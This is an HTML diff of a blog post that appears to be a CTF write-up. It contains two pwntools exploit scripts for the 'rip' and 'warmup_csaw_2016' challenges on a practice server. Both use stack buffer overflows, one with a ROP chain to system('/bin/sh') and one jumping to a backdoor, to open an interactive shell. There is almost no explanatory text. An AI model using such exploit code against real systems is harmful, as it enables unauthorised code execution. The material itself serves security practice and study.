@@ -24,6 +24,11 @@
   </head>
   <body>
     
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-text">warmup_csaw_2016</span></a></li></ol></li></ol>
+    </div>
+    
     <div id="fixed-menu-wrap">
       <span class="iconfont icon-sousuo search-box menu-reset"></span>
       <span class="icon-toc menu-reset">Toc</span>
@@ -187,7 +192,63 @@
       <div>
       </div>
     </div>
-    
+    <h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="rip">rip<a class="post-anchor" href="#rip"></a></h2><p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+file_name = <span class="hljs-string">'./pwn1'</span>
+libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+ip = <span class="hljs-string">'node3.buuoj.cn'</span>
+port = <span class="hljs-string">'27500'</span>
+<span class="hljs-comment"># context.arch = 'amd64'</span>
+context.log_level=<span class="hljs-string">'debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+libc = ELF(libc_name)
+elf = ELF(file_name)
+<span class="hljs-comment"># p = process(file_name)</span>
+p = remote(ip,int(port))
+
+bin_sh_addr=<span class="hljs-number">0x40201B</span>
+pop_rdi=<span class="hljs-number">0x4011fb</span>
+payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">23</span>
+payload += p64(pop_rdi)
+payload += p64(bin_sh_addr)
+payload += p64(<span class="hljs-number">0x0000000000401016</span>)
+payload += p64(elf.symbols[<span class="hljs-string">"system"</span>])
+<span class="hljs-comment"># gdb.attach(p)</span>
+p.sendline(payload)
+p.interactive()</code></pre>
+
+<h2 id="warmup-csaw-2016">warmup_csaw_2016<a class="post-anchor" href="#warmup-csaw-2016"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+file_name = <span class="hljs-string">'./warmup_csaw_2016'</span>
+libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+ip = <span class="hljs-string">'node3.buuoj.cn'</span>
+port = <span class="hljs-string">'29098'</span>
+<span class="hljs-comment"># context.arch = 'amd64'</span>
+context.log_level=<span class="hljs-string">'debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+libc = ELF(libc_name)
+elf = ELF(file_name)
+<span class="hljs-comment"># p = process(file_name)</span>
+p = remote(ip,int(port))
+li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
+ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)
+
+backdoor = <span class="hljs-number">0x00000000040060D</span>
+ret = <span class="hljs-number">0x00000000004004a1</span>
+p.recvuntil(<span class="hljs-string">"&gt;"</span>)
+
+<span class="hljs-comment"># gdb.attach(p)</span>
+p.sendline(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x48</span>+p64(backdoor))
+p.interactive()</code></pre>
+
+
 
   
     <div class="post-reward">
